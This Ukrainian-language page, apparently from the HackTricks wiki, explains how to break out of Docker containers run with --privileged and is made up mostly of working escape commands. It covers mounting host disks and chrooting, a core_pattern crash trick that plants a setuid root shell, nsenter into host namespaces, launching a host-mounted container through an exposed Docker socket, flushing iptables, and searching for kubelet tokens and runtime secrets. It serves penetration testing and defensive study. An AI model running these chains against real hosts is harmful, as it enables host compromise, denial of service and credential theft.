# Вихід із `--privileged` контейнерів

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Контейнер, запущений із `--privileged`, — це не те саме, що звичайний контейнер із одним або двома додатковими дозволами. На практиці `--privileged` прибирає або послаблює кілька стандартних runtime-захистів, які зазвичай не дозволяють workload отримувати доступ до небезпечних ресурсів host. Точний ефект залежить від runtime та host, але для Docker типовим результатом є:

- надаються всі capabilities
- обмеження device cgroup скасовуються
- багато kernel filesystems перестають монтуватися лише для читання
- стандартні замасковані шляхи procfs зникають
- фільтрацію seccomp вимкнено
- ізоляцію AppArmor вимкнено
- ізоляцію SELinux вимкнено або замінено значно ширшою міткою

Важливим наслідком є те, що privileged container зазвичай **не** потребує складного kernel exploit. У багатьох випадках він може просто взаємодіяти з host devices, kernel filesystems, доступними з host, або runtime interfaces безпосередньо, а потім виконати pivot до shell на host.

## Що `--privileged` не змінює автоматично

`--privileged` **не** приєднує автоматично контейнер до host PID, network, IPC або UTS namespaces. Privileged container усе ще може мати власні private namespaces. Це означає, що для деяких escape chains потрібна додаткова умова, наприклад:

- host bind mount
- спільний host PID
- host networking
- доступні host devices
- доступні для запису інтерфейси proc/sys

У реальних misconfigurations ці умови часто легко виконати, але концептуально вони є окремими від самого `--privileged`.

## Шляхи виходу

### 1. Монтування диска host через exposed devices

Privileged container зазвичай бачить набагато більше device nodes у `/dev`. Якщо block device host доступний, найпростіший спосіб виходу — змонтувати його та виконати `chroot` у файлову систему host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Якщо кореневий розділ неочевидний, спочатку перерахуй структуру блоків:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Якщо практичний шлях полягає в розміщенні setuid helper у доступному для запису монтуванні хоста, а не у використанні `chroot`, пам’ятайте, що не кожна файлова система враховує біт setuid. Швидка перевірка можливостей на стороні хоста:
```bash
mount | grep -v "nosuid"
```
Це корисно, оскільки шляхи з можливістю запису у файлових системах `nosuid` значно менш цікаві для класичних сценаріїв «скинути setuid shell і виконати її пізніше».

Послаблені засоби захисту, які тут використовуються:

- повний доступ до пристроїв
- широкі capabilities, особливо `CAP_SYS_ADMIN`

Пов’язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Змонтувати або повторно використати bind mount хоста та `chroot`

Якщо коренева файлова система хоста вже змонтована всередині container, або якщо container може створювати необхідні монтування, оскільки він privileged, до хостової shell часто веде лише один `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо прив’язка кореневого каталогу хоста відсутня, але сховище хоста доступне, створіть її:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Цей шлях використовує:

- послаблені обмеження mount
- повні capabilities
- відсутність MAC confinement

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Використання доступного для запису `/proc/sys` або `/sys`

Одним із важливих наслідків `--privileged` є значне послаблення захисту procfs і sysfs. Це може відкрити kernel interfaces, орієнтовані на host, які зазвичай маскуються або монтуються лише для читання.

Класичним прикладом є `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
До інших цінних шляхів належать:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Цей шлях використовує:

- відсутні замасковані шляхи
- відсутні доступні лише для читання системні шляхи

Пов’язані сторінки:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Використання повного набору capabilities для escape на основі mount або namespace

Привілейований container отримує capabilities, які зазвичай видаляються зі стандартних containers, зокрема `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` та багато інших. Цього часто достатньо, щоб перетворити початковий локальний доступ на escape на host, щойно з’являється інша доступна поверхня атаки.

Простий приклад — монтування додаткових файлових систем і використання входу до namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Якщо PID хоста також спільний, крок стає ще коротшим:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Цей шлях зловживає:

- стандартним набором privileged capabilities
- optional sharing хостового PID

Пов'язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape через Runtime Sockets

Privileged container часто отримує доступ до стану або сокетів runtime хоста. Якщо Docker, containerd або CRI-O socket доступний, найпростішим підходом часто є використання runtime API для запуску другого container з доступом до хоста:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Для containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Цей шлях зловживає:

- відкритим доступом до privileged runtime
- host bind mounts, створеними самим runtime

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Усунення побічних ефектів ізоляції мережі

`--privileged` сам по собі не приєднує контейнер до мережевого namespace хоста, але якщо контейнер також використовує `--network=host` або інший доступ до мережі хоста, увесь мережевий стек стає змінюваним:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це не завжди дає прямий shell хоста, але може призвести до denial of service, перехоплення трафіку або доступу до management-сервісів, доступних лише через loopback.

Пов’язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Читання секретів хоста та стану runtime

Навіть коли негайний вихід із контейнера через shell неможливий, privileged-контейнери часто мають достатній доступ для читання секретів хоста, стану kubelet, метаданих runtime і файлових систем сусідніх контейнерів:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Якщо `/var` змонтовано з хоста або каталоги runtime видимі, цього може бути достатньо для lateral movement або викрадення cloud/Kubernetes credentials ще до отримання host shell.

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Перевірки

Мета наведених нижче команд — підтвердити, які способи escape із privileged container є безпосередньо доступними.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Що тут є цікавого:

- повний набір capabilities, особливо `CAP_SYS_ADMIN`
- доступний для запису proc/sys
- видимі пристрої хоста
- відсутні seccomp і MAC-обмеження
- runtime-сокети або bind mounts кореневої файлової системи хоста

Будь-чого одного з цього може бути достатньо для post-exploitation. Кілька таких ознак разом зазвичай означають, що до компрометації хоста функціонально залишилася одна-дві команди.

## Пов'язані сторінки

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Посилання

- [1] [Втеча з привілейованих контейнерів заради розваги](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
